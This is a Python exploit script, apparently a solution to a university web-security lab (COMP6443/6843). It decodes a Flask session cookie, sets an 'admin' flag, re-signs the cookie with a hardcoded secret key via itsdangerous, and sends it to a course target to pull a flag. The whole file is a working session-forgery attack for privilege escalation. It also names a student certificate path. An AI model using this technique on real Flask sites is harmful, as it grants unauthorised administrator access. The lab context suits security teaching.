#!/usr/bin/env python

import base64
import json
import re
import requests
import itsdangerous
import flask.sessions


class colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    RESET = '\033[0m'


def decode_flask_cookie(cookie):
    try:
        data = base64.b64decode(cookie.split(
            ".")[0] + "==").decode(errors='ignore')
        return json.loads(data)
    except Exception as e:
        print(f"{colors.RED}[!] Error decoding session: {colors.RESET}{e}")
        return None


def forge_flask_cookie(secret_key, original_data):
    original_data["admin"] = True
    serializer = itsdangerous.URLSafeTimedSerializer(secret_key)
    forged_cookie = serializer.dumps(
        original_data)

    return forged_cookie


s = requests.Session()
s.cert = "/home/archer/uni/COMP6843/z3291100.pem"
flag_pattern = re.compile(r"COMP6443\{.+?\}")
url = "https://keyboard.quoccacorp.com"

s.get(url)
session_cookie = s.cookies.get("session")
print(f"{colors.GREEN}[+] Session Cookie: {colors.RESET}{session_cookie}")
decoded_session = decode_flask_cookie(session_cookie)
if decoded_session:
    print(
        f"{colors.YELLOW}[+] Decoded Session: {colors.RESET}{decoded_session}")
else:
    print(f"{colors.RED}[!] Could not decode session! Exiting.{colors.RESET}")
    exit(1)

secret_key = "$hallICompareTHEE2aSummersday"
forged_cookie = forge_flask_cookie(secret_key, decoded_session)
print(f"{colors.GREEN}[+] Forged Cookie: {colors.RESET}{forged_cookie}")
s.cookies.clear()
s.cookies.set("session", forged_cookie)

r = s.get(url)
flag = flag_pattern.search(r.text)

if flag:
    print(f"{colors.PURPLE}[+] Flag: {colors.RESET}{flag.group()}")
else:
    print(f"{colors.RED}[!] Flag not found!{colors.RESET}")
    print(r.text)
